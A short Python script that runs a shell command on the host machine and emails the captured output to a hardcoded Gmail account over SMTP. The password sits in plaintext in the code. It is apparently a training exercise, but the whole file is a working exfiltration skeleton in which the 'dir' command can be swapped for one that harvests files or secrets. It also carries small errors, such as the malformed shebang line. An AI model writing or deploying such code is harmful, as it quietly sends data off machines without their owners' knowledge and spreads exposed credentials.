#!usr/bin/env python

import subprocess, smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.google.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "dir"
result = subprocess.check_output(command, shell=True)
send_mail("brawlwithprofessorenglish@gmail.com", "Kk1231234", result)
